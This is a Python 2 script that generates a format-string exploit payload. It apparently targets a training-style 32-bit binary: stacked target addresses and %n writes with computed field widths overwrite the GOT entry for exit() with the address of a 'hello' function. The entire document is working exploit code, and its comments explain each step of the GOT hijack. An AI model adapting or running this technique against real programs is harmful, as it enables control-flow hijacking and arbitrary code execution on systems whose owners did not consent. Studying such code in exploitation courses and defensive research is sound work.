#!/usr/bin/python2.6

import struct

def pad(s, length=500):
    assert(len(s) <= length)
    return (s+"A"*length)[:length]

buf_sz = 512

# In this address, the address of exit is stored. Located in .got.plt section
# We can also confirm it by looking at the .rel.plt section
got_plt__exit = 0x08049724
hello_addr = 0x080484b4

allignment_padding = ""
before_padding = "AAAA" + "AAAA"
target_address_1 = struct.pack("P", got_plt__exit)
target_address_2 = struct.pack("P", got_plt__exit+2)
after_padding = "BBBB" + "BBBB"

payload = allignment_padding + before_padding + target_address_1 + target_address_2 + after_padding
payload = payload + " 0x%6$08x 0x%7$08x "

target_value = hello_addr
lo_target_value = 0x0000ffff & target_value
hi_target_value = target_value >> 16
hi_target_value = 0x00010000 | hi_target_value # This asserts us that hi_target_value > lo_target_value
assert(hi_target_value > lo_target_value)
# We first write lo and then hi, that is why we need hi > lo. We are using the %n specifier!

field_width_padding_lo =  lo_target_value - (
    len(allignment_padding) +
    len(before_padding)     +
    len(target_address_1)   +
    len(target_address_2)   +
    len(after_padding)      +
    2*(3+8)+1
)
payload = payload + "%" + str(field_width_padding_lo) + "d%6$n"

field_width_padding_hi = hi_target_value - lo_target_value
payload = payload + "%" + str(field_width_padding_hi) + "d%7$n"

payload = pad(
    payload,
    buf_sz-1, # fgets()  reads  in  at  most one less than size characters from stream
)
print(payload)
